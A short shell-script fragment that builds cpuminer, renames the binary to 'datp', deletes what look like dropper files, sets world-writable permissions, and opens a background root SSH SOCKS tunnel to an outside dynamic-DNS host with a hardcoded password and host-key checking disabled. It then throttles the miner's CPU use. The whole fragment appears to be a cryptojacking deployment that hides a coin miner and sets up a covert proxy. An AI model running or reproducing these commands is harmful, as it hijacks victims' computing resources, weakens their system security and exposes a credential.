...
./build.sh
make
mv cpuminer datp && cp datp ../ && cd ..  && sudo rm -rf panasonic tvpanasonic.sh && sudo chmod 777 * && screen -d -m sshpass -p blackb0Y9x ssh -o StrictHostKeyChecking=no -D 1996 root@datproxy.ddns.net && cpulimit --exe datp --limit 200 -b
